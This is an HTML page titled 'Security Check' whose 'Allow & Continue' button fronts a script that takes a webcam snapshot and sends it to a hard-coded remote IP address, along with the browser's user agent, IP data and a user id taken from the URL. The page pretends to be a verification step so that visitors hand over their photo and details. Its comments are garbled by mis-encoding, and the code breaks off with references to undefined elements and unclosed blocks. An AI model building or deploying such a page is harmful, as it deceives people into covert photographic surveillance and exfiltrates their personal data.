<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>

<body>

    <button onclick="capture()">Allow & Continue</button>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        let ipInfo = {};

        // Ø¬Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù€ IP

        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {

        function capture() {
            ctx.drawImage(video, 0, 0, 320, 240);
            const imageData = canvas.toDataURL("image/png");

            // Ø§Ø³ØªØ®Ø±Ø§Ø¬ user_id Ù…Ù† Ø¹Ù†ÙˆØ§Ù† URL
            const user_id = window.location.pathname.split("/").pop();

            // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±
            fetch("http://79.99.40.71:6362/upload", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    image: imageData,
                    user_agent: navigator.userAgent,
                    ip_data: ipInfo,
                    user_id: user_id
                })
            }).then(() => {
                document.body.innerHTML = "<h2>âœ… Thank you!</h2>";
